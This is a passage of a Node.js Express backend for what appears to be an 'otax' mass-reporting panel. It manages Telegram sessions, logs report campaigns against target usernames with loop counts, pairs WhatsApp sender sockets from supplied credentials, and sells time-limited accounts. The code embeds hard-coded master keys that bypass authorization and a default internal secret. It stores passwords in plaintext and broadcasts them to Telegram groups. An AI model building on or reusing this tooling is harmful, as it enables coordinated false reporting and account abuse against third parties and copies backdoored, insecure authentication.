    }
});

app.get('/api/telegram/sessions', (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: 'Access denied'
            });
        }

        const sessionKey = authHeader.substring(7);

        let foundUsername = null;
        let userSessions = [];

        if (fs.existsSync(SESSION_DIR_TELEGRAM)) {
            const users = fs.readdirSync(SESSION_DIR_TELEGRAM);

            for (const user of users) {
                const userDir = path.join(SESSION_DIR_TELEGRAM, user);
                if (fs.statSync(userDir).isDirectory()) {
                    const sessionsFile = path.join(userDir, 'sessions.json');
                    if (fs.existsSync(sessionsFile)) {
                        const sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
                        const hasSession = sessions.some(s => s.sessionKey === sessionKey && s.isActive);
                        if (hasSession) {
                            foundUsername = user;
                            userSessions = sessions;
                            break;
                        }
                    }
                }
            }
        }

        if (!foundUsername) {
            return res.status(401).json({
                success: false,
                message: 'Session invalid'
            });
        }


        const formattedSessions = userSessions.map(session => ({
            session_key: session.sessionKey,
            phone_number: session.phoneNumber,
            username: session.username,
            user_id: session.userId,
            created_at: session.createdAt,
            is_active: session.isActive
        }));

        res.json({
            success: true,
            sessions: formattedSessions,
            current_user: foundUsername
        });

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});


app.delete('/api/telegram/session/:targetSessionKey', async (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: 'Access denied'
            });
        }

        const currentSessionKey = authHeader.substring(7);
        const { targetSessionKey } = req.params;

        let foundUsername = null;
        let targetSessionString = null;


        if (fs.existsSync(SESSION_DIR_TELEGRAM)) {
            const users = fs.readdirSync(SESSION_DIR_TELEGRAM);

            for (const user of users) {
                const userDir = path.join(SESSION_DIR_TELEGRAM, user);
                if (fs.statSync(userDir).isDirectory()) {
                    const sessionsFile = path.join(userDir, 'sessions.json');
                    if (fs.existsSync(sessionsFile)) {
                        const sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));


                        const hasCurrentSession = sessions.some(s => s.sessionKey === currentSessionKey && s.isActive);


                        const targetSession = sessions.find(s => s.sessionKey === targetSessionKey);

                        if (hasCurrentSession && targetSession) {
                            foundUsername = user;
                            targetSessionString = targetSession.sessionString;
                            break;
                        }
                    }
                }
            }
        }

        if (!foundUsername) {
            return res.status(401).json({
                success: false,
                message: 'Session invalid'
            });
        }


        if (targetSessionString) {
            try {
                const client = await getTelegramClient(targetSessionString);
                await client.invoke(new Api.auth.LogOut());
                telegramClients.delete(targetSessionString);
            } catch (error) {
                console.log('Telegram logout error (may already be logged out):', error.message);
            }
        }


        const userDir = path.join(SESSION_DIR_TELEGRAM, foundUsername);
        const sessionsFile = path.join(userDir, 'sessions.json');

        if (fs.existsSync(sessionsFile)) {
            let sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
            const initialLength = sessions.length;
            sessions = sessions.filter(s => s.sessionKey !== targetSessionKey);

            if (sessions.length < initialLength) {
                fs.writeFileSync(sessionsFile, JSON.stringify(sessions, null, 2));

                res.json({
                    success: true,
                    message: 'Session successfully deleted',
                    remaining_sessions: sessions.length
                });
            } else {
                res.status(404).json({
                    success: false,
                    message: 'Session not found'
                });
            }
        } else {
            res.status(404).json({
                success: false,
                message: 'No sessions found'
            });
        }

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});


app.get('/api/telegram/my-reports', (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: 'Access denied'
            });
        }

        const sessionKey = authHeader.substring(7);

        let foundUsername = null;

        if (fs.existsSync(SESSION_DIR_TELEGRAM)) {
            const users = fs.readdirSync(SESSION_DIR_TELEGRAM);

            for (const user of users) {
                const userDir = path.join(SESSION_DIR_TELEGRAM, user);
                if (fs.statSync(userDir).isDirectory()) {
                    const sessionsFile = path.join(userDir, 'sessions.json');
                    if (fs.existsSync(sessionsFile)) {
                        const sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
                        const hasSession = sessions.some(s => s.sessionKey === sessionKey && s.isActive);
                        if (hasSession) {
                            foundUsername = user;
                            break;
                        }
                    }
                }
            }
        }

        if (!foundUsername) {
            return res.status(401).json({
                success: false,
                message: 'Session invalid'
            });
        }


        const userDir = path.join(SESSION_DIR_TELEGRAM, foundUsername);
        const reportsFile = path.join(userDir, 'reports.json');

        let reports = [];
        if (fs.existsSync(reportsFile)) {
            reports = JSON.parse(fs.readFileSync(reportsFile, 'utf8'));
        }


        const formattedReports = reports.map(report => ({
            id: report.id,
            target: report.target_username,
            target_username: report.target_username,
            reason: report.reason,
            loops: report.loops,
            custom_message: report.custom_message,
            status: report.status,
            success_rate: report.success_rate,
            successful: report.successful_reports,
            total_attempts: report.total_attempts,
            created_at: report.created_at
        }));

        res.json({
            success: true,
            reports: formattedReports,
            count: formattedReports.length
        });

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});


app.get('/api/telegram/check-session', async (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: 'Access denied'
            });
        }

        const sessionKey = authHeader.substring(7);

        let foundSession = null;
        let foundUsername = null;

        if (fs.existsSync(SESSION_DIR_TELEGRAM)) {
            const users = fs.readdirSync(SESSION_DIR_TELEGRAM);

            for (const user of users) {
                const userDir = path.join(SESSION_DIR_TELEGRAM, user);
                if (fs.statSync(userDir).isDirectory()) {
                    const sessionsFile = path.join(userDir, 'sessions.json');
                    if (fs.existsSync(sessionsFile)) {
                        const sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
                        const session = sessions.find(s => s.sessionKey === sessionKey && s.isActive);
                        if (session) {
                            foundSession = session;
                            foundUsername = user;
                            break;
                        }
                    }
                }
            }
        }

        if (!foundSession) {
            return res.json({
                success: false,
                message: 'Session invalid'
            });
        }


        try {
            const client = await getTelegramClient(foundSession.sessionString);
            const me = await client.getMe();

            res.json({
                success: true,
                user: {
                    username: me.username || foundSession.username,
                    phone_number: foundSession.phoneNumber,
                    user_id: me.id,
                    first_name: me.firstName,
                    last_name: me.lastName,
                    is_bot: me.bot,
                    is_premium: me.premium
                }
            });
        } catch (error) {

            foundSession.isActive = false;
            saveSession(foundUsername, foundSession);

            res.json({
                success: false,
                message: 'Telegram session expired'
            });
        }

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});


app.delete('/api/telegram/logout', async (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: 'Access denied'
            });
        }

        const sessionKey = authHeader.substring(7);

        let deleted = false;
        let foundUsername = null;
        let sessionString = null;

        if (fs.existsSync(SESSION_DIR_TELEGRAM)) {
            const users = fs.readdirSync(SESSION_DIR_TELEGRAM);

            for (const user of users) {
                const userDir = path.join(SESSION_DIR_TELEGRAM, user);
                if (fs.statSync(userDir).isDirectory()) {
                    const sessionsFile = path.join(userDir, 'sessions.json');
                    if (fs.existsSync(sessionsFile)) {
                        let sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
                        const initialLength = sessions.length;


                        const session = sessions.find(s => s.sessionKey === sessionKey);
                        if (session) {
                            sessionString = session.sessionString;
                        }

                        sessions = sessions.filter(s => s.sessionKey !== sessionKey);

                        if (sessions.length < initialLength) {
                            fs.writeFileSync(sessionsFile, JSON.stringify(sessions, null, 2));
                            deleted = true;
                            foundUsername = user;
                            break;
                        }
                    }
                }
            }
        }


        if (sessionString) {
            try {
                const client = await getTelegramClient(sessionString);
                await client.invoke(new Api.auth.LogOut());
                telegramClients.delete(sessionString);
            } catch (error) {
                console.log('Telegram logout error:', error.message);
            }
        }

        if (deleted) {
            res.json({
                success: true,
                message: 'Logout successful',
                username: foundUsername
            });
        } else {
            res.json({
                success: true,
                message: 'Session not found or already logged out'
            });
        }

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});


app.get('/api/system/info', (req, res) => {
    try {
        let totalSessions = 0;
        let totalUsers = 0;
        let totalReports = 0;

        if (fs.existsSync(SESSION_DIR_TELEGRAM)) {
            const users = fs.readdirSync(SESSION_DIR_TELEGRAM);
            totalUsers = users.length;

            for (const user of users) {
                const userDir = path.join(SESSION_DIR_TELEGRAM, user);


                const sessionsFile = path.join(userDir, 'sessions.json');
                if (fs.existsSync(sessionsFile)) {
                    const sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
                    totalSessions += sessions.filter(s => s.isActive).length;
                }


                const reportsFile = path.join(userDir, 'reports.json');
                if (fs.existsSync(reportsFile)) {
                    const reports = JSON.parse(fs.readFileSync(reportsFile, 'utf8'));
                    totalReports += reports.length;
                }
            }
        }

        res.json({
            success: true,
            system: {
                name: 'otax Telegram Report System',
                version: '3.0.0',
                api_version: '2.0',
                status: 'operational',
                uptime: process.uptime(),
                telegram_api_id: API_ID,
                telegram_api_hash: API_HASH.substring(0, 8) + '...',
                sessions_dir: SESSION_DIR_TELEGRAM,
                total_users: totalUsers,
                total_sessions: totalSessions,
                total_reports: totalReports,
                active_clients: telegramClients.size,
                features: [
                    'real-telegram-api',
                    'multi-session-support',
                    'report-history',
                    'session-management',
                    'rate-limiting-protection'
                ]
            }
        });

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});


app.post('/api/telegram/verify-password', async (req, res) => {
    try {
        const { phone_number, password } = req.body;

        if (!phone_number || !password) {
            return res.status(400).json({
                success: false,
                message: 'Phone number and password are required'
            });
        }


        const tempFile = path.join(__dirname, 'temp_login.json');
        if (!fs.existsSync(tempFile)) {
            return res.status(400).json({
                success: false,
                message: 'Login session not found. Please request OTP again'
            });
        }

        const logins = JSON.parse(fs.readFileSync(tempFile, 'utf8'));
        const loginData = logins[phone_number];

        if (!loginData) {
            return res.status(400).json({
                success: false,
                message: 'Login session not found for this number'
            });
        }


        const session = new StringSession(loginData.clientSession);
        const client = new TelegramClient(session, API_ID, API_HASH, {
            connectionRetries: 5,
        });

        await client.connect();


        await client.signInWithPassword({
            password: async () => password,
        });


        const me = await client.getMe();


        const sessionKey = generateSessionKey();
        const sessionString = session.save();


        const sessionData = {
            sessionKey,
            sessionString,
            phoneNumber: phone_number,
            username: me.username || `user_${phone_number.replace(/\D/g, '').slice(-6)}`,
            userId: me.id.toString(),
            createdAt: new Date().toISOString(),
            isActive: true
        };


        saveSession(sessionData.username, sessionData);


        saveUserData(sessionData.username, {
            lastLogin: new Date().toISOString(),
            phoneNumber: phone_number,
            firstName: me.firstName || '',
            lastName: me.lastName || '',
            isBot: me.bot || false,
            isPremium: me.premium || false,
            has2FA: true
        });


        delete logins[phone_number];
        fs.writeFileSync(tempFile, JSON.stringify(logins, null, 2));


        telegramClients.set(sessionString, client);

        res.json({
            success: true,
            session_key: sessionKey,
            user: {
                user_id: me.id,
                username: me.username || sessionData.username,
                phone_number: phone_number,
                first_name: me.firstName,
                last_name: me.lastName,
                created_at: sessionData.createdAt,
                has_2fa: true
            }
        });

    } catch (error) {
        console.error('Verify password error:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

const realtimeStats = {
    onlineUsers: 0,
    activeConnections: new Map(),
    userSessions: new Map(),
    notifications: []
};

const NOTIFICATIONS_FILE = path.join(__dirname, 'data', 'notifications.json');
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

function loadNotifications() {
    try {
        if (!fs.existsSync(NOTIFICATIONS_FILE)) {
            fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify([], null, 2));
            return [];
        }
        const data = JSON.parse(fs.readFileSync(NOTIFICATIONS_FILE, 'utf8') || "[]");
        return Array.isArray(data) ? data : [];
    } catch {
        return [];
    }
}

function saveNotifications(notifications) {
    if (!Array.isArray(notifications)) notifications = [];
    fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify(notifications.slice(0, 50), null, 2));
}

function initializeNotificationsFile() {
    if (!fs.existsSync(NOTIFICATIONS_FILE)) {
        fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify([], null, 2));
    }
}

function broadcastStats() {
    const payload = JSON.stringify({
        type: "stats_update",
        online_users: realtimeStats.onlineUsers,
        timestamp: Date.now()
    });

    wss.clients.forEach(c => {
        if (c.readyState === WebSocket.OPEN) c.send(payload);
    });
}

function broadcastNotification(notification) {
    const payload = JSON.stringify({
        type: "notification",
        data: notification
    });

    wss.clients.forEach(c => {
        if (c.readyState === WebSocket.OPEN) c.send(payload);
    });
}

const realtimeStatsx = {
    sessions: new Map(),
    activeConnections: new Map(),
    userSessions: new Map()
};

setInterval(() => {
    const now = Date.now();
    for (const [k, v] of realtimeStatsx.sessions) {
        if (now - v > 5 * 60 * 1000) realtimeStatsx.sessions.delete(k);
    }
    for (const [k, v] of realtimeStatsx.userSessions) {
        if (now - (v.loginTime || 0) > 30 * 60 * 1000) realtimeStatsx.userSessions.delete(k);
    }
    for (const [k, v] of realtimeStatsx.activeConnections) {
        if (now - v > 5 * 60 * 1000) realtimeStatsx.activeConnections.delete(k);
    }
}, 60000);

app.get("/api/stats/real-time", async (req, res) => {
    let { key } = req.query;
    const auth = req.headers.authorization;
    if (!key && auth) key = auth.replace("Bearer ", "");

    const validation = await validateKeyAndUser(key, req);
    if (validation.error) {
        return res.status(validation.error.status).json({ success: false });
    }
    const user = validation.user;

    realtimeStatsx.sessions.set(key, Date.now());

    if (!realtimeStatsx.userSessions.has(key)) {
        realtimeStatsx.userSessions.set(key, {
            connections: 0,
            loginTime: Date.now()
        });
    }

    const session = realtimeStatsx.userSessions.get(key);

    res.json({
        success: true,
        timestamp: Date.now(),
        online_users: realtimeStatsx.sessions.size,
        total_online: realtimeStatsx.sessions.size,
        global_stats: {
            online_users: realtimeStatsx.sessions.size,
            total_active_connections: [...realtimeStatsx.activeConnections.values()].reduce((a, b) => a + b, 0),
            server_uptime: process.uptime()
        },
        personal_stats: {
            active_connections: session.connections
        },
        your_connections: session.connections,
        connections_count: session.connections,
        user: {
            username: user.username,
            role: user.role,
            onlineSince: session.loginTime
        }
    });
});

app.get("/mySenderxn", async (req, res) => {
    const { key } = req.query;
    const username = await getUserByKey(key, req);
    if (!key || !username) return res.status(401).json({ valid: false });

    const db = loadDatabase();
    const user = db.find(u => u.username && u.username.trim().toLowerCase() === username.trim().toLowerCase());
    if (!user) return res.status(401).json({ valid: false });

    const connections = getActiveCredsInFolder(user.username) || [];
    const activeConns = connections.filter(c => c.status === "online");

    realtimeStatsx.activeConnections.set(key, activeConns.length);

    if (!realtimeStatsx.userSessions.has(key)) {
        realtimeStatsx.userSessions.set(key, {
            connections: activeConns.length,
            loginTime: Date.now()
        });
    } else {
        realtimeStatsx.userSessions.get(key).connections = activeConns.length;
    }

    res.json({
        valid: true,
        timestamp: Date.now(),
        connections,
        user: {
            username: user.username,
            totalConnections: connections.length,
            activeConnections: activeConns.length
        },
        active_connections: activeConns.length,
        total_connections: connections.length,
        summary: {
            online: activeConns.length,
            idle: connections.length - activeConns.length,
            total: connections.length
        }
    });
});

app.get("/notify/list", async (req, res) => {
    const { key } = req.query;
    const validation = await validateKeyAndUser(key, req);
    if (validation.error) return res.status(401).json([]);

    const list = loadNotifications()
        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
        .slice(0, 20);

    res.json(list);
});

app.post("/notify/send", async (req, res) => {
    const { key, title, message, type = "info" } = req.body;
    if (!message) return res.status(400).json({ success: false, message: "Message is required" });
    const validation = await validateKeyAndUser(key, req);
    if (validation.error) {
        return res.status(401).json({ success: false });
    }
    const user = validation.user;
    if (!user || user.role !== "KINGZ") {
        return res.status(403).json({ success: false });
    }

    const notifications = loadNotifications();
    const notif = {
        id: Date.now(),
        title: title || "📢 Notification",
        message,
        type,
        createdAt: new Date().toISOString(),
        sender: user.username
    };

    notifications.unshift(notif);
    saveNotifications(notifications);
    broadcastNotification(notif);

    res.json({ success: true, notification: notif });
});

wss.on("connection", ws => {
    ws.on("message", msg => {
        const data = JSON.parse(msg);

        if (data.type === "auth" && data.token && activeKeys[data.token]) {
            realtimeStats.userSessions.set(data.token, {
                username: activeKeys[data.token].username,
                role: data.role,
                loginTime: Date.now(),
                connections: 0,
                ws
            });

            realtimeStats.onlineUsers = Array.from(realtimeStats.userSessions.values())
                .filter(s => s.ws.readyState === WebSocket.OPEN)
                .length;

            broadcastStats();

            ws.send(JSON.stringify({ type: "auth_success" }));
        }

        if (data.type === "ping") {
            ws.send(JSON.stringify({ type: "pong", ts: Date.now() }));
        }
    });

    ws.on("close", () => {
        for (const [k, v] of realtimeStats.userSessions.entries()) {
            if (v.ws === ws) realtimeStats.userSessions.delete(k);
        }

        realtimeStats.onlineUsers = Array.from(realtimeStats.userSessions.values())
            .filter(s => s.ws.readyState === WebSocket.OPEN)
            .length;

        broadcastStats();
    });
});

initializeNotificationsFile();


app.post("/api/pair-from-creds", async (req, res) => {
    const { creds, number, owner, adp_alias, server_id, server_name, path: credsPath } = req.body;

    if (!creds || !number || !owner) {
        return res.status(400).json({ success: false, error: "Missing required fields" });
    }

    try {
        const baseDir = path.join("otaxayun", owner);
        const sessionDir = path.join(baseDir, number);

        if (fs.existsSync(sessionDir)) {
            fs.rmSync(sessionDir, { recursive: true, force: true });
        }

        if (!fs.existsSync(baseDir)) {
            fs.mkdirSync(baseDir, { recursive: true });
        }

        fs.mkdirSync(sessionDir, { recursive: true });

        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        Object.assign(state.creds, creds);

        const version = await getBaileysVersion();

        const otax = makeWASocket({
            agent: globalProxyAgent,
            syncFullHistory: false,
            generateHighQualityLinkPreviews: false,
            keepAliveIntervalMs: 25000,
            logger: pino({ level: "silent" }),
            auth: state,
            syncFullHistory: false,
            markOnlineOnConnect: true,
            connectTimeoutMs: 120000,
            defaultQueryTimeoutMs: 120000,
            generateHighQualityLinkPreview: false,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            version,
            maxMsgRetryCount: 50,
            retryRequestDelayMs: 5000,
            getMessage: async () => undefined
        });

        otax.ev.on("creds.update", saveCreds);

        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error("Connection timeout")), 30000);

            otax.ev.on("connection.update", ({ connection, lastDisconnect }) => {
                if (connection === "open") {
                    clearTimeout(timeout);
                    resolve(true);
                } else if (connection === "close") {
                    clearTimeout(timeout);
                    const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
                    if (isLoggedOut) {
                        reject(new Error("Credentials invalid / logged out"));
                    }
                }
            });
        });

        activeConnections[number] = otax;

        return res.json({
            success: true,
            number,
            session_data: state.creds,
            server_id,
            server_name,
            adp_alias
        });

    } catch (err) {
        return res.status(400).json({ success: false, error: err.message || "Invalid credentials" });
    }
});
app.delete("/deleteSender", async (req, res) => {
    try {
        const { key, id } = req.query;
        if (!key || !id) {
            return res.status(400).json({
                valid: false,
                message: "Key and ID are required"
            });
        }

        reloadActiveKeys();
        const keyInfo = activeKeys[key];
        if (!keyInfo) {
            return res.status(401).json({
                valid: false,
                message: "Invalid or expired key"
            });
        }

        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);
        if (blockReview(user, res)) return;
        if (!user) {
            return res.status(404).json({
                valid: false,
                message: "User not found"
            });
        }

        if (global.mySenderCache) {
            global.mySenderCache.delete(user.username);
        }

        let phone = id.replace(/\D/g, '');
        if (!phone || phone.length < 8) {
            return res.status(400).json({
                valid: false,
                message: "Invalid phone number format"
            });
        }

        const senderId = phone.includes('@') ? phone : `${phone}@c.us`;

        if (
            global.otaxConnections &&
            global.otaxConnections[user.username] &&
            global.otaxConnections[user.username][senderId]
        ) {
            const conn = global.otaxConnections[user.username][senderId];

            if (conn.socket) {
                try {
                    if (conn.socket.ws && conn.socket.ws.readyState === 1) {
                        conn.socket.ws.close();
                    }
                } catch { }

                try {
                    if (conn.socket.end && typeof conn.socket.end === 'function') {
                        conn.socket.end();
                    }
                } catch { }
            }

            try {
                if (conn.connection && typeof conn.connection.logout === 'function') {
                    await conn.connection.logout();
                }
            } catch { }

            delete global.otaxConnections[user.username][senderId];

            if (Object.keys(global.otaxConnections[user.username]).length === 0) {
                delete global.otaxConnections[user.username];
            }
        }

        const userFolder = path.join(__dirname, "otaxayun", user.username);
        if (fs.existsSync(userFolder)) {
            const items = fs.readdirSync(userFolder);
            items.forEach(item => {
                const itemPath = path.join(userFolder, item);
                const stat = fs.statSync(itemPath);
                if (stat.isDirectory()) {
                    if (item.includes(phone) || item === phone) {
                        try {
                            fs.rmSync(itemPath, { recursive: true, force: true });
                        } catch { }
                    }
                }
            });
        }

        if (keyInfo.activeSender === phone || keyInfo.activeSender === senderId) {
            delete keyInfo.activeSender;
        }

        return res.json({
            valid: true,
            success: true,
            deletedNumber: phone,
            message: "Sender deleted successfully"
        });

    } catch (error) {
        return res.status(500).json({
            valid: false,
            message: "Internal server error"
        });
    }
});

app.get("/checkUser", async (req, res) => {
    const { username } = req.query;
    if (!username) return res.json({ exists: false, message: "Missing username" });

    const db = loadDatabaseFresh();
    const user = db.find(u => u.username && u.username.trim().toLowerCase() === username.trim().toLowerCase());

    if (user) {
        return res.json({ exists: true, message: "Username sudah digunakan." });
    } else {
        return res.json({ exists: false, message: "Username tersedia." });
    }
});
app.get("/createAccount", async (req, res) => {
    req.body = req.query; // konversi query params ke body
    const { key, newUser, pass, day, role } = req.body;

    let isSystemAdmin = (key === 'SYAMANTA!@!%!&' || key === 'SYAMANTA121517');
    let owner = null;

    if (!isSystemAdmin) {
        reloadActiveKeys();
        const keyInfo = activeKeys[key];
        if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

        const db = loadDatabaseFresh();
        owner = db.find(u => u.username === keyInfo.username);
        if (!owner || (owner.role !== "KINGZ" && owner.role !== "OWNER")) {
            return res.json({
                valid: true,
                authorized: false,
                message: "Lu Hama Coeg! Fitur ini hanya untuk KINGZ atau OWNER!"
            });
        }
    }

    const db = loadDatabaseFresh();

    if (!newUser || !pass || !day) {
        return res.json({ valid: true, created: false, message: "Incomplete parameters." });
    }

    if (db.find(u => u.username && u.username.trim().toLowerCase() === newUser.trim().toLowerCase())) {
        return res.json({ valid: true, created: false, message: "Username already exists." });
    }

    const days = parseInt(day);
    if (isNaN(days) || days <= 0) {
        return res.json({ valid: true, created: false, message: "Invalid day value." });
    }

    const expiredDate = createExpiryIsoWib(days);
    if (!expiredDate) {
        return res.json({ valid: true, created: false, message: "Invalid day value." });
    }

    let newRole = "member";
    if (isSystemAdmin) {
        if (role) newRole = role;
    } else if (owner.role === "KINGZ") {
        if (role) newRole = role;
    } else {
        const allowedRoles = ["member", "FULLUP"];
        if (role && !allowedRoles.includes(role)) {
            return res.json({
                valid: true,
                created: false,
                message: `OWNER cuma boleh membuat akun dengan role: ${allowedRoles.join(", ")}`
            });
        }
        if (role) newRole = role;
    }

    if (newRole === "member" && days > 300) {
        return res.json({
            valid: true,
            created: false,
            message: "Maksimal durasi untuk role member adalah 300 hari."
        });
    }

    const newAccount = {
        username: newUser,
        password: pass,
        role: newRole,
        expiredDate,
        createdBy: isSystemAdmin ? "SYSTEM_BOT" : owner.username,
        createdAt: new Date().toISOString()
    };

    db.push(newAccount);
    saveDatabase(db);

    return res.json({
        valid: true,
        created: true,
        user: {
            username: newAccount.username,
            role: newAccount.role,
            expiredDate: newAccount.expiredDate
        }
    });
});

app.post("/createAccount", async (req, res) => {
    const { key, newUser, pass, day, role } = req.body;


    let isSystemAdmin = (key === 'SYAMANTA!@!%!&' || key === 'SYAMANTA121517');
    let owner = null;

    if (!isSystemAdmin) {
        reloadActiveKeys();
        const keyInfo = activeKeys[key];
        if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

        const db = loadDatabaseFresh();
        owner = db.find(u => u.username === keyInfo.username);
        if (!owner || (owner.role !== "KINGZ" && owner.role !== "OWNER")) {
            return res.json({
                valid: true,
                authorized: false,
                message: "Lu Hama Coeg! Fitur ini hanya untuk KINGZ atau OWNER!"
            });
        }
    }

    const db = loadDatabaseFresh();

    if (!newUser || !pass || !day) {
        return res.json({ valid: true, created: false, message: "Incomplete parameters." });
    }

    if (db.find(u => u.username && u.username.trim().toLowerCase() === newUser.trim().toLowerCase())) {
        return res.json({ valid: true, created: false, message: "Username already exists." });
    }

    const days = parseInt(day);
    if (isNaN(days) || days <= 0) {
        return res.json({ valid: true, created: false, message: "Invalid day value." });
    }

    const expiredDate = createExpiryIsoWib(days);
    if (!expiredDate) {
        return res.json({ valid: true, created: false, message: "Invalid day value." });
    }

    let newRole = "member";
    if (isSystemAdmin) {
        if (role) newRole = role;
    } else if (owner.role === "KINGZ") {
        if (role) newRole = role;
    } else {
        const allowedRoles = ["member", "FULLUP"];
        if (role && !allowedRoles.includes(role)) {
            return res.json({
                valid: true,
                created: false,
                message: `OWNER cuma boleh membuat akun dengan role: ${allowedRoles.join(", ")}`
            });
        }
        if (role) newRole = role;
    }

    if (newRole === "member" && days > 300) {
        return res.json({
            valid: true,
            created: false,
            message: "Maksimal durasi untuk role member adalah 300 hari."
        });
    }

    const newAccount = {
        username: newUser,
        password: pass,
        role: newRole,
        expiredDate,
        createdBy: isSystemAdmin ? "SYSTEM_BOT" : owner.username,
        createdAt: new Date().toISOString()
    };

    db.push(newAccount);
    saveDatabase(db);

    const tkGroupIds = [...new Set([-1003486972998, -1003803373220, ...getTelegramGroupsByRole("TK")])];
    const ownerGroupIds = getTelegramGroupsByRole("OWNER");
    const reportGroupIds = [...new Set([...tkGroupIds, ...ownerGroupIds])];

    const notifText = `
🚨 <b>MANTA ACCOUNT CREATED (APK)</b>

👤 Dibuat oleh
• Nama : <b>${newAccount.createdBy}</b>
• ID   : <code>APK</code>

🆕 Akun
• Username : <b>${newUser}</b>
• Password : <b>${pass}</b>
• Role     : <b>${newAccount.role.toUpperCase()}</b>
• Durasi   : <b>${days} hari</b>
• Expired  : <b>${formatDateExp(newAccount.expiredDate)}</b>
`;

    try {
        for (const groupId of reportGroupIds) {
            await bot.sendMessage(groupId, notifText, { parse_mode: "HTML" }).catch(() => { });
        }
    } catch (err) { }

    return res.json({
        valid: true,
        created: true,
        user: {
            username: newAccount.username,
            role: newAccount.role,
            expiredDate: newAccount.expiredDate
        }
    });
});

app.get("/deleteUser", (req, res) => {
    const { key, username } = req.query;

    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({
            valid: false,
            error: true,
            message: "Invalid key."
        });
    }

    const db = loadDatabase();
    const requester = db.find(u => u.username === keyInfo.username);

    if (!requester || !["KINGZ", "OWNER"].includes(requester.role)) {
        return res.json({
            valid: true,
            authorized: false,
            message: "Only KINGZ or OWNER can delete users."
        });
    }

    const index = db.findIndex(u => u.username === username);
    if (index === -1) {
        return res.json({
            valid: true,
            deleted: false,
            message: "User not found."
        });
    }

    const targetUser = db[index];

    if (
        requester.role === "OWNER" &&
        targetUser.createdBy !== requester.username
    ) {
        return res.json({
            valid: true,
            deleted: false,
            message: "OWNER hanya bisa menghapus user yang dia buat sendiri."
        });
    }

    removeUserFromDatabase(db, index);
    saveDatabase(db);


    const keyList = loadKeyList();
    const cleanedKeyList = keyList.filter(e => e.username !== username);
    saveKeyList(cleanedKeyList);


    for (const k in activeKeys) {
        if (activeKeys[k].username === username) {
            delete activeKeys[k];
        }
    }

    fs.appendFileSync(
        "logUser.txt",
        `${requester.username} Deleted ${targetUser.username}\n`
    );

    return res.json({
        valid: true,
        deleted: true,
        user: {
            username: targetUser.username,
            role: targetUser.role,
            expiredDate: targetUser.expiredDate
        }
    });
});
app.get('/ping', (req, res) => {
    res.send('pong');
});

app.get('/internal/get-global-sender', (req, res) => {
    const secret = req.headers['x-internal-secret'];
    if (secret !== (process.env.INTERNAL_SECRET || 'otax_internal_2024')) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    if (process.env.IS_SENDER_POOL !== 'true') {
        return res.status(404).json({ error: 'Not a sender pool' });
    }
    const memberSessions = Object.keys(activeConnections);
    if (!memberSessions.length) {
        return res.json({ success: false, error: 'No active sender' });
    }
    const idx = Math.floor(Math.random() * memberSessions.length);
    const sessionName = memberSessions[idx];
    return res.json({ success: true, sessionName, total: memberSessions.length });
});

app.get('/internal/sessions', (req, res) => {
    const secret = req.headers['x-internal-secret'];
    if (secret !== (process.env.INTERNAL_SECRET || 'otax_internal_2024')) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    res.json({ sessions: Object.keys(activeConnections), count: Object.keys(activeConnections).length });
});




app.get("/listUsers", (req, res) => {
    const { key } = req.query;

    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({
            valid: false,
            error: true,
            message: "Invalid key."
        });
    }

    const db = loadDatabase();
    const requester = db.find(u => u.username === keyInfo.username);

    if (!requester || !["KINGZ", "OWNER"].includes(requester.role)) {
        return res.json({
            valid: true,
            authorized: false,
            message: "Only KINGZ or OWNER can view users."
        });
    }

    let users = requester.role === "KINGZ"
        ? db
        : db.filter(u => u.createdBy === requester.username);

    const result = users.map(u => ({
        username: u.username,
        role: u.role || "member",
        expiredDate: u.expiredDate,
        createdBy: u.createdBy || "-"
    }));

    return res.json({
        valid: true,
        authorized: true,
        total: result.length,
        users: result
    });
});

app.get("/userAdd", (req, res) => {
    const { key, username, password, role, day } = req.query;
    console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

    reloadActiveKeys();
    const keyInfo = activeKeys[key];
